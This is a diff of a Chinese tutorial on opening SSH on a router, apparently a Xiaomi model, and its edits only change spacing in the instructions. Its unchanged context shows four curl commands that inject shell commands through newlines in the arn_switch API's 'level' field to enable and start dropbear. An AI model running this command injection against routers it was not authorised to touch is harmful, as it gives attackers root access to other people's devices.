@@ -116,7 +116,7 @@
 
 `curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=token/api/misystem/arn_switch -d "open=1&model=1&level=%0Anvram%20set%20ssh_en%3D1%0A"`
 
-其中，将stok=token中的token替换成路由器的stok。
+其中，将 stok=token 中的 token 替换成路由器的 stok 。
 
 例如，我的stok为`030b24d39b1a4a549aa12dac23c52313`，则应输入到cmd的指令为：
 
@@ -125,19 +125,19 @@
 ### 3. 在cmd中输入指令2：
 
 `curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=token/api/misystem/arn_switch -d "open=1&model=1&level=%0Anvram%20commit%0A"`
-    其中，将`stok=token`中的`token`替换成路由器的`stok`。
+    其中，将 stok=token 中的 token 替换成路由器的 stok。
 
 ### 4. 在cmd中输入指令3：
 
 `curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=token/api/misystem/arn_switch -d "open=1&model=1&level=%0Ased%20-i%20's%2Fchannel%3D.*%2Fchannel%3D%22debug%22%2Fg'%20%2Fetc%2Finit.d%2Fdropbear%0A"`
 
-其中，将`stok=token`中的`token`替换成路由器的`stok`。
+其中，将 stok=token 中的 token 替换成路由器的 stok 。
 
 ### 5. 在cmd中输入指令4：
 
 `curl -X POST http://192.168.31.1/cgi-bin/luci/;stok=token/api/misystem/arn_switch -d "open=1&model=1&level=%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A"`
 
-其中，将`stok=token`中的`token`替换成路由器的`stok`。
+其中，将 stok=token 中的 token 替换成路由器的 stok 。
 
 ### 6.通过MobaXterm连接路由器的ssh,ip:`192.168.31.1`
 
